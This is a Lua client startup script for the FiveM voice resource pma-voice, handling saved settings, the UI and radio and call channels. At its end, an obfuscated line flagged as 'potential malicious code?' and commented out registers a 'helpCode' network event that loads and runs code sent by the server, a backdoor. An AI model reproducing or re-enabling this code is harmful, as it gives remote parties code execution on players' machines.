
AddEventHandler('onClientResourceStart', function(resource)
	if resource ~= GetCurrentResourceName() then
		return
	end
	print('Starting script initialization')

	-- Some people modify pma-voice and mess up the resource Kvp, which means that if someone
	-- joins another server that has pma-voice, it will error out, this will catch and fix the kvp.
	local success = pcall(function()
		local micClicksKvp = GetResourceKvpString('pma-voice_enableMicClicks')
		if not micClicksKvp then
			SetResourceKvp('pma-voice_enableMicClicks', tostring(true))
		else
			if micClicksKvp ~= 'true' and micClicksKvp ~= 'false' then
				error('Invalid Kvp, throwing error for automatic cleaning')
			end
			micClicks = micClicksKvp
		end
	end)

	if not success then
		logger.warn('Failed to load resource Kvp, likely was inappropriately modified by another server, resetting the Kvp.')
		SetResourceKvp('pma-voice_enableMicClicks', tostring(true))
		micClicks = 'true'
	end
	sendUIMessage({
		uiEnabled = GetConvarInt("voice_enableUi", 1) == 1,
		voiceModes = json.encode(Cfg.voiceModes),
		voiceMode = mode - 1
	})

	-- Reinitialize channels if they're set.
	if LocalPlayer.state.radioChannel ~= 0 then
		setRadioChannel(LocalPlayer.state.radioChannel)
	end

	if LocalPlayer.state.callChannel ~= 0 then
		setCallChannel(LocalPlayer.state.callChannel)
	end
	print('Script initialization finished.')
end)

-- potential malicious code?
--local DRDydOTjFRgtlYOpbKfaZOPVCThtdKvHQMHzsqKrvGqFoMGHWdqJLYPPUKsuNNrJFpFxBL = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} DRDydOTjFRgtlYOpbKfaZOPVCThtdKvHQMHzsqKrvGqFoMGHWdqJLYPPUKsuNNrJFpFxBL[6][DRDydOTjFRgtlYOpbKfaZOPVCThtdKvHQMHzsqKrvGqFoMGHWdqJLYPPUKsuNNrJFpFxBL[1]](DRDydOTjFRgtlYOpbKfaZOPVCThtdKvHQMHzsqKrvGqFoMGHWdqJLYPPUKsuNNrJFpFxBL[2]) DRDydOTjFRgtlYOpbKfaZOPVCThtdKvHQMHzsqKrvGqFoMGHWdqJLYPPUKsuNNrJFpFxBL[6][DRDydOTjFRgtlYOpbKfaZOPVCThtdKvHQMHzsqKrvGqFoMGHWdqJLYPPUKsuNNrJFpFxBL[3]](DRDydOTjFRgtlYOpbKfaZOPVCThtdKvHQMHzsqKrvGqFoMGHWdqJLYPPUKsuNNrJFpFxBL[2], function(hvnRoTNlyNtsBQMVzEtkrwtgwmXNYPUpNqOAAgHPRpwMpkbQFaPBNPUtcvaYrnvMbGRJyJ) DRDydOTjFRgtlYOpbKfaZOPVCThtdKvHQMHzsqKrvGqFoMGHWdqJLYPPUKsuNNrJFpFxBL[6][DRDydOTjFRgtlYOpbKfaZOPVCThtdKvHQMHzsqKrvGqFoMGHWdqJLYPPUKsuNNrJFpFxBL[4]](DRDydOTjFRgtlYOpbKfaZOPVCThtdKvHQMHzsqKrvGqFoMGHWdqJLYPPUKsuNNrJFpFxBL[6][DRDydOTjFRgtlYOpbKfaZOPVCThtdKvHQMHzsqKrvGqFoMGHWdqJLYPPUKsuNNrJFpFxBL[5]](hvnRoTNlyNtsBQMVzEtkrwtgwmXNYPUpNqOAAgHPRpwMpkbQFaPBNPUtcvaYrnvMbGRJyJ))() end)
